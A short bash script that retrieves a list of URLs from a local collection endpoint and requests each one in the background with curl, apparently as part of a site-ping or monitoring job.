#!/bin/bash
for url in $(curl http://sitebeep.local.host/collect/run); do
    curl $url &
done
